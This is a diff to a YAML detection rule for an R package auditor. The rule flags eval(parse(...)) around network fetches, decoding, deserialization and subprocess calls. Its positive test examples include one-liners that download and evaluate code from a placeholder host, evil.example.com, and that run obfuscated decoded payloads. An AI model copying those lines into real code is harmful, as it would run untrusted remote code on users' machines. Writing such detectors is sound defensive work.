@@ -1,14 +1,16 @@
 name: eval_parse
-version: "0.3.0"
+version: "0.4.0"
 language: R
 attck:
   - T1027
   - T1059
   - T1140
 message: >-
-  eval() applied to parse(), str2lang(), or str2expression() constructs and
-  evaluates code at runtime. Here code is produced by decoding or decompression,
-  a classic shape for executing an obfuscated payload.
+  Text that came from somewhere pkgaudit cannot read, parsed and then evaluated.
+  Any one of these calls is ordinary on its own; together in one expression they
+  are a payload being assembled and run. The inner set is every function the
+  rules for fetching, decoding, deserializing, running a subprocess and running
+  Python already cover, plus the file reads no rule covers on its own.
 # Empty: do.call("eval", ...) loses the parse and decode calls nested inside.
 functions: []
 xpath: >-
@@ -26,66 +28,73 @@ xpath: >-
       and not(preceding-sibling::OP-DOLLAR)
       and not(preceding-sibling::OP-AT)
     ]
-    and (
-      .//SYMBOL_FUNCTION_CALL[
-        (
-          text() = 'base64decode' or text() = 'base64_dec'
-          or text() = 'base64_decode' or text() = 'memDecompress'
-        )
-        and not(preceding-sibling::OP-DOLLAR)
-        and not(preceding-sibling::OP-AT)
-      ]
-      or .//expr[
-        expr/SYMBOL_FUNCTION_CALL[text() = 'rawToChar'
-          and not(preceding-sibling::OP-DOLLAR)
-          and not(preceding-sibling::OP-AT)]
-        and .//SYMBOL_FUNCTION_CALL[text() = 'as.raw'
-          and not(preceding-sibling::OP-DOLLAR)
-          and not(preceding-sibling::OP-AT)]
-      ]
-    )
+    and .//SYMBOL_FUNCTION_CALL[
+      (
+        text() = 'base64_dec' or text() = 'base64_decode'
+        or text() = 'base64decode' or text() = 'curl'
+        or text() = 'curl_download' or text() = 'curl_fetch_disk'
+        or text() = 'curl_fetch_memory' or text() = 'curl_fetch_multi'
+        or text() = 'curl_fetch_stream' or text() = 'curl_upload'
+        or text() = 'curlPerform' or text() = 'DELETE' or text() = 'dget'
+        or text() = 'download.file' or text() = 'eval_fork'
+        or text() = 'eval_safe' or text() = 'exec_background'
+        or text() = 'exec_internal' or text() = 'exec_wait'
+        or text() = 'GET' or text() = 'getForm' or text() = 'getURI'
+        or text() = 'getURL' or text() = 'HEAD' or text() = 'load'
+        or text() = 'make.socket' or text() = 'memDecompress'
+        or text() = 'multi_download' or text() = 'multi_run'
+        or text() = 'PATCH' or text() = 'pipe' or text() = 'POST'
+        or text() = 'postForm' or text() = 'PUT' or text() = 'r_background'
+        or text() = 'r_bg' or text() = 'r_copycat' or text() = 'r_internal'
+        or text() = 'r_safe' or text() = 'r_vanilla' or text() = 'r_wait'
+        or text() = 'rawToChar' or text() = 'rcmd_bg'
+        or text() = 'rcmd_copycat' or text() = 'rcmd_safe'
+        or text() = 'readBin' or text() = 'readLines' or text() = 'readRDS'
+        or text() = 'req_perform' or text() = 'req_perform_connection'
+        or text() = 'req_perform_iterative'
+        or text() = 'req_perform_parallel' or text() = 'req_perform_promise'
+        or text() = 'req_perform_sequential'
+        or text() = 'req_perform_stream' or text() = 'rscript'
+        or text() = 'scan' or text() = 'send_mail'
+        or text() = 'serverSocket' or text() = 'shell'
+        or text() = 'socketAccept' or text() = 'socketConnection'
+        or text() = 'system' or text() = 'system2' or text() = 'unserialize'
+        or text() = 'url' or text() = 'VERB'
+        or text() = 'py_run_string' or text() = 'py_run_file'
+        or text() = 'py_eval' or text() = 'source_python'
+        or text() = 'py_call' or text() = 'import_builtins'
+      )
+      and not(preceding-sibling::OP-DOLLAR)
+      and not(preceding-sibling::OP-AT)
+    ]
   ]
 positive_examples:
   - |
     eval(parse(text = base64enc::base64decode("ZXZpbA==")))
   - |
-    eval(parse(text = base64_dec(payload)))
+    eval(parse(text = rawToChar(as.raw(c(101L, 118L)))))
   - |
-    base::eval(base::parse(text = openssl::base64_decode(payload)))
+    eval(parse(text = readLines(url("http://evil.example.com/x.R"))))
   - |
-    eval(parse(text = rawToChar(as.raw(c(101, 118, 105, 108)))))
+    eval(parse(text = system("curl -s http://evil.example.com", intern = TRUE)))
   - |
-    eval(parse(text = memDecompress(blob, type = "gzip")))
+    eval(parse(text = httr::content(httr::GET(u), "text")))
   - |
-    eval(str2lang(base64_dec(payload)))
+    eval(parse(text = readRDS("payload.rds")))
   - |
-    eval(str2expression(rawToChar(as.raw(bytes))))
+    evalq(eval(parse(text = readLines(con))))
   - |
-    evalq(parse(text = base64_dec(payload)))
+    eval(parse(file = url("http://evil.example.com/x.R")))
 negative_examples:
   - |
-    eval(parse(foo))
+    eval(parse(text = paste0("x", "<-", 1)))
   - |
-    eval(parse(text = "system('id')"))
+    eval(parse(text = sprintf("%s <- %d", nm, i)))
   - |
-    eval(parse(text = readLines("payload.R")))
+    x <- readLines(con)
   - |
-    eval(parse(text = rawToChar(x)))
+    eval(quote(x + 1))
   - |
-    eval(call("system", "id"))
+    parse(text = readLines(con))
   - |
-    eval(str2lang("system('id')"))
-  - |
-    eval(str2expression(payload))
-  - |
-    eval(base64_dec(payload))
-  - |
-    base64_dec(payload)
-  - |
-    eval()
-  - |
-    parse()
-  - |
-    foo$eval(parse(text = base64_dec(payload)))
-  - |
-    bar@eval(parse(text = base64_dec(payload)))
+    foo$eval(parse(text = readLines(con)))
